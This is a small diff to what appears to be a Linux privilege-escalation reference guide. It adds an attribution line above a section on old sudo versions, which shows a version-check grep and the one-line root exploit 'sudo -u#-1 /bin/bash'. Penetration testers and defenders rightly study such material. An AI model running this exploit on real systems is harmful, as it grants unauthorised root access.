@@ -86,6 +86,8 @@ sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.
 
 ### sudo &lt;= v1.28
 
+From @sickrov
+
 ```text
 sudo -u#-1 /bin/bash
 ```
